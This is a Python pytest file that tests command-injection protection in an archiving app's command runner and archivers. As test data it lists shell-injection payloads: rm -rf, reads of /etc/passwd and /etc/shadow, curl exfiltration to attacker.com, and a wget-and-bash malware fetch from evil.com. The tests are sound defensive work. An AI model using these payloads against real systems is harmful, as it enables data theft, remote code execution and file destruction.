"""
Integration tests for command injection protection.

Tests that malicious payloads in URLs and item_ids cannot execute arbitrary commands.
"""

from __future__ import annotations

import pytest
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch

from app.archivers.command_runner import CommandRunner, CommandResult
from app.archivers.monolith import MonolithArchiver
from app.archivers.singlefile import SingleFileArchiver
from app.archivers.screenshot import ScreenshotArchiver
from app.archivers.pdf import PDFArchiver


# Malicious payloads that should NOT execute arbitrary commands
MALICIOUS_URLS = [
    # Command injection attempts
    "https://example.com; rm -rf /",
    "https://example.com && cat /etc/passwd",
    "https://example.com | wget http://attacker.com/malware.sh",
    "https://example.com`curl http://attacker.com/exfil?data=$(whoami)`",
    "https://example.com$(curl http://attacker.com/steal)",

    # Shell metacharacters
    "https://example.com & whoami",
    "https://example.com ; ls -la",
    "https://example.com || id",
    "https://example.com | tee /tmp/hacked",

    # Backticks and subshells
    "https://example.com`id`",
    "https://example.com$(id)",
    "`whoami`",
    "$(cat /etc/shadow)",

    # Newline injection
    "https://example.com\nwhoami",
    "https://example.com\nrm -rf /tmp/test",

    # Null byte injection
    "https://example.com\x00whoami",
]

MALICIOUS_ITEM_IDS = [
    # Similar command injection attempts in item_id
    "test; rm -rf /",
    "test && whoami",
    "test | cat /etc/passwd",
    "`curl http://attacker.com`",
    "$(wget http://evil.com)",
    "test\nwhoami",
]


class TestCommandRunnerSecurity:
    """Test CommandRunner against command injection."""

    def test_command_as_list_prevents_injection(self):
        """Test that passing command as list prevents shell interpretation."""
        with tempfile.TemporaryDirectory() as tmpdir:
            runner = CommandRunner(data_dir=Path(tmpdir))

            # This should be treated as a literal argument, not executed
            malicious_arg = "; rm -rf /"

            # Use a safe command (echo) that accepts the malicious string as literal arg
            result = runner.execute(
                command=["echo", malicious_arg],
                timeout=5.0,
            )

            # The malicious payload should appear in output as literal string
            # It should NOT execute (which would delete files)
            assert result.exit_code == 0
            assert malicious_arg in result.stdout
            assert not result.timed_out

    def test_shell_metacharacters_treated_as_literals(self):
        """Test that shell metacharacters are treated as literal strings."""
        with tempfile.TemporaryDirectory() as tmpdir:
            runner = CommandRunner(data_dir=Path(tmpdir))

            # Test various shell metacharacters
            metacharacters = [";", "&", "|", "`", "$", "\n", "||", "&&"]

            for meta in metacharacters:
                # These should be treated as literal strings in arguments
                result = runner.execute(
                    command=["echo", f"test{meta}safe"],
                    timeout=5.0,
                )

                assert result.exit_code == 0
                # The metacharacter should appear as literal in output
                assert meta in result.stdout or meta.encode() in result.stdout.encode()

    def test_command_with_spaces_handled_correctly(self):
        """Test that arguments with spaces are handled correctly."""
        with tempfile.TemporaryDirectory() as tmpdir:
            runner = CommandRunner(data_dir=Path(tmpdir))

            # Arguments with spaces should work without shell interpretation
            arg_with_spaces = "test argument with spaces"

            result = runner.execute(
                command=["echo", arg_with_spaces],
                timeout=5.0,
            )

            assert result.exit_code == 0
            assert "spaces" in result.stdout


class TestArchiverSecurity:
    """Test that all archivers properly handle malicious inputs."""

    @pytest.fixture
    def mock_settings(self):
        """Create mock settings for testing."""
        with tempfile.TemporaryDirectory() as tmpdir:
            settings = Mock()
            settings.data_dir = Path(tmpdir)
            settings.archive_output_dir = Path(tmpdir) / "output"
            settings.archive_output_dir.mkdir(parents=True, exist_ok=True)
            yield settings

    def test_monolith_archiver_malicious_url(self, mock_settings):
        """Test MonolithArchiver with malicious URLs."""
        archiver = MonolithArchiver(settings=mock_settings)

        # Mock subprocess.run to capture command
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            for malicious_url in MALICIOUS_URLS[:5]:  # Test subset
                result = archiver.archive(url=malicious_url, item_id="test")

                # Verify command was called with list (not shell string)
                assert mock_run.called
                call_args = mock_run.call_args

                # First argument should be a list
                assert isinstance(call_args[0][0], list)

                # shell parameter should be False
                assert call_args[1].get("shell") is False

                # URL should be in command as literal argument
                assert malicious_url in call_args[0][0]

                mock_run.reset_mock()

    def test_screenshot_archiver_malicious_url(self, mock_settings):
        """Test ScreenshotArchiver with malicious URLs."""
        archiver = ScreenshotArchiver(settings=mock_settings)

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            for malicious_url in MALICIOUS_URLS[:5]:
                result = archiver.archive(url=malicious_url, item_id="test")

                assert mock_run.called
                call_args = mock_run.call_args

                # Verify list command and shell=False
                assert isinstance(call_args[0][0], list)
                assert call_args[1].get("shell") is False
                assert malicious_url in call_args[0][0]

                mock_run.reset_mock()

    def test_pdf_archiver_malicious_url(self, mock_settings):
        """Test PDFArchiver with malicious URLs."""
        archiver = PDFArchiver(settings=mock_settings)

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            for malicious_url in MALICIOUS_URLS[:5]:
                result = archiver.archive(url=malicious_url, item_id="test")

                assert mock_run.called
                call_args = mock_run.call_args

                assert isinstance(call_args[0][0], list)
                assert call_args[1].get("shell") is False
                assert malicious_url in call_args[0][0]

                mock_run.reset_mock()

    def test_singlefile_archiver_malicious_url(self, mock_settings):
        """Test SingleFileArchiver with malicious URLs."""
        archiver = SingleFileArchiver(settings=mock_settings)

        with patch("subprocess.run") as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout="", stderr="")

            for malicious_url in MALICIOUS_URLS[:5]:
                result = archiver.archive(url=malicious_url, item_id="test")

                assert mock_run.called
                call_args = mock_run.call_args

                assert isinstance(call_args[0][0], list)
                assert call_args[1].get("shell") is False
                assert malicious_url in call_args[0][0]

                mock_run.reset_mock()


class TestRealWorldScenarios:
    """Test real-world attack scenarios."""

    def test_data_exfiltration_attempt(self):
        """Test that data exfiltration attempts are neutralized."""
        with tempfile.TemporaryDirectory() as tmpdir:
            runner = CommandRunner(data_dir=Path(tmpdir))

            # Attacker tries to exfiltrate /etc/passwd
            malicious_url = "https://example.com; curl http://attacker.com/steal?data=$(cat /etc/passwd)"

            # This should fail gracefully without executing the exfiltration
            # Using 'false' command which always fails
            result = runner.execute(
                command=["false", malicious_url],
                timeout=5.0,
            )

            # Command should fail (false always returns 1)
            # but malicious payload should NOT execute
            assert result.exit_code == 1
            assert not result.timed_out

    def test_file_deletion_attempt(self):
        """Test that file deletion attempts are neutralized."""
        with tempfile.TemporaryDirectory() as tmpdir:
            runner = CommandRunner(data_dir=Path(tmpdir))

            # Create a test file
            test_file = Path(tmpdir) / "important_file.txt"
            test_file.write_text("important data")

            # Attacker tries to delete it
            malicious_url = f"https://example.com; rm -f {test_file}"

            # Execute with echo (safe command)
            result = runner.execute(
                command=["echo", malicious_url],
                timeout=5.0,
            )

            # File should still exist (rm should not have executed)
            assert test_file.exists()
            assert test_file.read_text() == "important data"

    def test_remote_code_execution_attempt(self):
        """Test that remote code execution attempts are neutralized."""
        with tempfile.TemporaryDirectory() as tmpdir:
            runner = CommandRunner(data_dir=Path(tmpdir))

            # Attacker tries to download and execute malware
            malicious_url = "https://example.com; wget http://evil.com/malware.sh -O /tmp/m && bash /tmp/m"

            # Execute with echo
            result = runner.execute(
                command=["echo", malicious_url],
                timeout=5.0,
            )

            # Should complete successfully without executing malware
            assert result.exit_code == 0
            assert "malware" in result.stdout


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
